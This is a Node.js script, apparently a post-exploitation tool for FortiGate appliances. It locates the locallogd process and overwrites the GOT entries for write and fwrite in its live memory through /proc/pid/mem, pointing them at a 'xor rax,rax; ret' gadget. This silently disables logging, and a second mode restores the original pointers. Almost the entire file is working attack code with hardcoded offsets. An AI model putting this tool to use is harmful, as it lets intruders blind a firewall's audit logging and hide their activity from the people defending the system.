#!/usr/bin/env node

const fs = require('fs');
const path = require('path');

// ==================== Configuration ====================


// Address constants (modify according to your target environment)


// ==================== Memory Read/Write (Synchronous) ====================

/**
 * Write data to target process memory (synchronous)
 * @param {number} pid Target process PID
 * @param {bigint} address Starting virtual address
 * @param {Buffer} data Buffer to write
 * @returns {number} Number of bytes written
 * @throws Will throw if bytes written != data.length
 */
function writeProcessMemory(pid, address, data) {
    const memPath = `/proc/${pid}/mem`;
    let fd = null;
    try {
        fd = fs.openSync(memPath, 'r+');
        const bytesWritten = fs.writeSync(fd, data, 0, data.length, Number(address));
        if (bytesWritten !== data.length) {
            throw new Error(`Wrote only ${bytesWritten} bytes, expected ${data.length}`);
        }
        return bytesWritten;
    } finally {
        if (fd !== null) fs.closeSync(fd);
    }
}



/**
 * Read data from target process memory (synchronous)
 * @param {number} pid Target process PID
 * @param {bigint} address Starting virtual address
 * @param {number} length Number of bytes to read
 * @returns {Buffer} Buffer containing read data
 * @throws Will throw if bytes read != length
 */
function readProcessMemory(pid, address, length) {
    const memPath = `/proc/${pid}/mem`;
    let fd = null;
    try {
        fd = fs.openSync(memPath, 'r');
        const buffer = Buffer.alloc(length);
        const bytesRead = fs.readSync(fd, buffer, 0, length, Number(address));
        if (bytesRead !== length) {
            throw new Error(`Read only ${bytesRead} bytes, expected ${length}`);
        }
        return buffer;
    } finally {
        if (fd !== null) fs.closeSync(fd);
    }
}



// ==================== Utility Functions ====================

/**
 * Convert buffer (little-endian) to 64-bit unsigned BigInt
 */
function bufferToUint64LE(buf) {
    return buf.readBigUInt64LE(0);
}



/**
 * Convert 64-bit BigInt to little-endian buffer
 */
function uint64LEToBuffer(value) {
    const buffer = Buffer.alloc(8);
    buffer.writeBigUInt64LE(value, 0);
    return buffer;
}



/**
 * Find PID of a process by name (synchronous)
 * @param {string} targetName Process name (e.g., 'locallogd')
 * @returns {number} Process PID
 * @throws If no matching process is found
 */
function getPidByName(targetName) {
    const procDir = '/proc';
    let entries;
    try {
        entries = fs.readdirSync(procDir);
    } catch (err) {
        throw new Error(`Cannot read /proc directory: ${err.message}`);
    }

    for (const entry of entries) {
        if (!/^\d+$/.test(entry)) continue;
        const pid = parseInt(entry, 10);
        const statPath = path.join(procDir, pid.toString(), 'stat');
        let statContent;
        try {
            statContent = fs.readFileSync(statPath, 'utf8');
        } catch (err) {
            continue; // Process may have exited
        }
        const leftParen = statContent.indexOf('(');
        const rightParen = statContent.lastIndexOf(')');
        if (leftParen === -1 || rightParen === -1) continue;
        const comm = statContent.substring(leftParen + 1, rightParen);
        if (comm === targetName) {
            return pid;
        }
    }
    throw new Error(`Process with name "${targetName}" not found`);
}



/**
 * Write two addresses to a JSON file (synchronous)
 * @param {bigint} writeaddr - write function address
 * @param {bigint} fwriteaddr - fwrite function address
 */
function writeAddress(writeaddr, fwriteaddr) {
	const jsonObject = {
		write: '0x' + writeaddr.toString(16),   // 例如 "0x7f8a4c0"
		fwrite: '0x' + fwriteaddr.toString(16)
	};
	console.log(jsonObject);
	
    const jsonString = JSON.stringify(jsonObject, null, 2);
    try {
        fs.writeFileSync('/tmp/fortigate_log_control.json', jsonString, 'utf8');
        console.log('JSON file written successfully:', '/tmp/fortigate_log_control.json');
    } catch (err) {
        console.error('Write failed:', err);
    }
}



/**
 * Read addresses from JSON file and convert back to BigInt (synchronous)
 * @returns {{ write: bigint, fwrite: bigint }}
 * @throws If file read or parse fails
 */
function readAddress() {
    try {
        const jsonString = fs.readFileSync('/tmp/fortigate_log_control.json', 'utf8');
		console.log(jsonString);
        const jsonObject = JSON.parse(jsonString);
        const write = BigInt(jsonObject.write);
        const fwrite = BigInt(jsonObject.fwrite);
        return { write, fwrite };
    } catch (err) {
        console.error('Read or parse failed:', err);
        throw err;
    }
}



/**
 * Get base address of an executable from /proc/pid/maps (synchronous)
 * @param {number} pid Process PID
 * @param {string} execPath Path to executable (e.g., '/bin/init')
 * @returns {bigint} Starting virtual address
 * @throws If maps file cannot be read or path not found
 */
function getExecutableBase(pid, execPath) {
    const mapsPath = `/proc/${pid}/maps`;
    let mapsContent;
    try {
        mapsContent = fs.readFileSync(mapsPath, 'utf8');
    } catch (err) {
        throw new Error(`Cannot read ${mapsPath}: ${err.message}`);
    }

    const lines = mapsContent.split('\n');
    for (const line of lines) {
        if (line.trim() === '') continue;
        const fields = line.trim().split(/\s+/);
        if (fields.length < 6) continue;
        const pathname = fields.slice(5).join(' ');
        if (pathname === execPath) {
            const addrRange = fields[0];
            const startAddrStr = addrRange.split('-')[0];
            const startAddr = BigInt(`0x${startAddrStr}`);
            return startAddr;
        }
    }
    throw new Error(`Path "${execPath}" not found in maps of PID ${pid}`);
}



// ==================== Main Logic ====================

/**
 * Disable logging by reading original function pointers and saving them
 */
function disableLog() {
    try {
        const pid = getPidByName('locallogd');
        console.log(`locallogd pid: ${pid}`);

        let baseAddr = getExecutableBase(pid, '/bin/init');
        console.log(`/bin/init base address: 0x${baseAddr.toString(16)}`);

		let ADDR_FWRITE_PTR, ADDR_WRITE_PTR, ADDR_RET_PTR;

        if (baseAddr === 0x400000n ) 
		{
            //baseAddr = 0n;
			ADDR_FWRITE_PTR = 0x42945B8n - 0x400000n;
			ADDR_WRITE_PTR  = 0x4296D60n - 0x400000n;
			//ADDR_RET_PTR    = 0x43E016n - 0x400000;
			ADDR_RET_PTR    = 0x1725FD3n- 0x400000n;
			//ADDR_RET_PTR    = 0x54FB09n- 0x400000n;
        }
		else{
			ADDR_FWRITE_PTR = 0x4FECB30n;   // 存放 write 函数指针的地址（GOT 表项）
			ADDR_WRITE_PTR  = 0x4FEF468n;   // 存放 fwrite 函数指针的地址
			//ADDR_RET_PTR = 0X3B8016n;
			ADDR_RET_PTR = 0X107B64An;	//31 c0 c3 "xor rax,rax; ret"
			//ADDR_RET_PTR    = 0x4F7998n;	//48 89 d0 c3 "mov rax,rdx ;ret"		
		}

        console.log(`ADDR_FWRITE_PTR:${ADDR_FWRITE_PTR.toString(16)},ADDR_WRITE_PTR:${ADDR_WRITE_PTR.toString(16)},ADDR_RET_PTR:${ADDR_RET_PTR.toString(16)}`);
        const bytesAddrFwrite = readProcessMemory(pid, baseAddr + ADDR_FWRITE_PTR, 8);
        const bytesAddrWrite = readProcessMemory(pid, baseAddr + ADDR_WRITE_PTR, 8);
        const bytesRetValue = readProcessMemory(pid, baseAddr + ADDR_RET_PTR, 8);

        const FwriteAddr = bufferToUint64LE(bytesAddrFwrite);
        const WriteAddr  = bufferToUint64LE(bytesAddrWrite);
        const retValue  = bufferToUint64LE(bytesRetValue);

		if(FwriteAddr === WriteAddr && (baseAddr + ADDR_RET_PTR === WriteAddr)){
			console.log(`already in disable state.Nothing to do`);
			console.log(`fwrite:${FwriteAddr.toString(16)},write:${WriteAddr.toString(16)},ret:${retValue.toString(16)}`);
			return 0;
		}
		writeAddress(WriteAddr, FwriteAddr);

        console.log(`\n0x${ADDR_FWRITE_PTR.toString(16)} QWORD: 0x${FwriteAddr.toString(16)}`);
        console.log(`0x${ADDR_WRITE_PTR.toString(16)} QWORD: 0x${WriteAddr.toString(16)}`);
        console.log(`0x${ADDR_RET_PTR.toString(16)} QWORD: 0x${retValue.toString(16)}`);

        const fwriteCode = readProcessMemory(pid, FwriteAddr, 16);
        const writeCode  = readProcessMemory(pid, WriteAddr, 16);

        console.log(`\n[fwrite] ${FwriteAddr.toString(16)} 16 bytes:`);
        console.log(`  hex: ${fwriteCode.toString('hex')}`);

        console.log(`\n[write] ${WriteAddr.toString(16)} 16 bytes:`);
        console.log(`  hex: ${writeCode.toString('hex')}`);

		const bytesRetAddr = uint64LEToBuffer(baseAddr + ADDR_RET_PTR);
        // Overwrite GOT entries with return address (disable logging)
        writeProcessMemory(pid, baseAddr + ADDR_FWRITE_PTR, bytesRetAddr);
        writeProcessMemory(pid, baseAddr + ADDR_WRITE_PTR, bytesRetAddr);

    } catch (err) {
        console.error(`error: ${err.message}`);
        process.exit(1);
    }
}



/**
 * Enable logging by restoring original function pointers saved earlier
 */
function enableLog() {
    try {
        const pid = getPidByName('locallogd');
        console.log(`Found locallogd process, pid: ${pid}`);

        let baseAddr = getExecutableBase(pid, '/bin/init');
        console.log(`/bin/init base address: 0x${baseAddr.toString(16)}`);

		let ADDR_FWRITE_PTR, ADDR_WRITE_PTR, ADDR_RET_PTR;

        if (baseAddr === 0x400000n ) 
		{
            //baseAddr = 0n;
			ADDR_FWRITE_PTR = 0x42945B8n - 0x400000n;
			ADDR_WRITE_PTR  = 0x4296D60n - 0x400000n;
			//ADDR_RET_PTR    = 0x43E016n - 0x400000;
			ADDR_RET_PTR    = 0x1725FD3n- 0x400000n;
			//ADDR_RET_PTR    = 0x54FB09n- 0x400000n;	
        }
		else{
			ADDR_FWRITE_PTR = 0x4FECB30n;   // 存放 write 函数指针的地址（GOT 表项）
			ADDR_WRITE_PTR  = 0x4FEF468n;   // 存放 fwrite 函数指针的地址
			//ADDR_RET_PTR = 0X3B8016n;
			ADDR_RET_PTR = 0X107B64An;	//31 c0 c3 "xor rax,rax; ret"
			//ADDR_RET_PTR    = 0x4F7998n;	//48 89 d0 c3 "mov rax,rdx ;ret"		
		}
        console.log(`ADDR_FWRITE_PTR:${ADDR_FWRITE_PTR.toString(16)},ADDR_WRITE_PTR:${ADDR_WRITE_PTR.toString(16)},ADDR_RET_PTR:${ADDR_RET_PTR.toString(16)}`);
        const bytesAddrFwrite = readProcessMemory(pid, baseAddr + ADDR_FWRITE_PTR, 8);
        const bytesAddrWrite  = readProcessMemory(pid, baseAddr + ADDR_WRITE_PTR, 8);
        const bytesRetValue    = readProcessMemory(pid, baseAddr + ADDR_RET_PTR, 8);

        const FwriteAddr = bufferToUint64LE(bytesAddrFwrite);
        const WriteAddr  = bufferToUint64LE(bytesAddrWrite);
        const RetValue  = bufferToUint64LE(bytesRetValue);

        // Check if currently disabled (GOT points to retAddr)
        if (FwriteAddr === baseAddr + ADDR_RET_PTR && WriteAddr === baseAddr + ADDR_RET_PTR) {
            // Already disabled, proceed to restore
        } else {
            console.log(`Not in disabled state, nothing to do`);
			console.log(`fwrite:${FwriteAddr.toString(16)},write:${WriteAddr.toString(16)},ret:${RetValue.toString(16)}`);
            return;
        }

        //console.log(`\n0x${ADDR_FWRITE_PTR.toString(16)} QWORD: 0x${FwriteAddr.toString(16)}`);
        //console.log(`0x${ADDR_WRITE_PTR.toString(16)} QWORD: 0x${WriteAddr.toString(16)}`);
        //console.log(`0x${ADDR_RET_PTR.toString(16)} QWORD: 0x${RetValue.toString(16)}`);

        const addresses = readAddress();
        const writeAddress = addresses.write;
        const fwriteAddress = addresses.fwrite;

        const bytesFwrite = uint64LEToBuffer(fwriteAddress);
        const bytesWrite  = uint64LEToBuffer(writeAddress);
		
		console.log(`fwrite: 0x${fwriteAddress.toString(16)},write: 0x${writeAddress.toString(16)}`);

        writeProcessMemory(pid, baseAddr + ADDR_FWRITE_PTR, bytesFwrite);
        writeProcessMemory(pid, baseAddr + ADDR_WRITE_PTR, bytesWrite);

    } catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}



/**
 * Parse command line arguments
 * @returns {object} Key-value arguments
 */
function parseArgs() {
    const args = {};
    process.argv.slice(2).forEach(arg => {
        if (arg.startsWith('--')) {
            const [key, value] = arg.slice(2).split('=');
            args[key] = value || true;
        } else if (arg.startsWith('-')) {
            args[arg.slice(1)] = true;
        } else {
            args['_' + (Object.keys(args).length)] = arg;
        }
    });
    return args;
}



/**
 * Main entry point
 */
function main() {
    try {
        const args = parseArgs();
        console.log(args);

        if (args.disable) {
            //console.log('disable');
            disableLog();
        } else if (args.enable) {
            //console.log('enable');
            enableLog();
        } else {
            console.error('Usage: ${progName} -disable/enable');
            process.exit(1);
        }
    } catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}




main();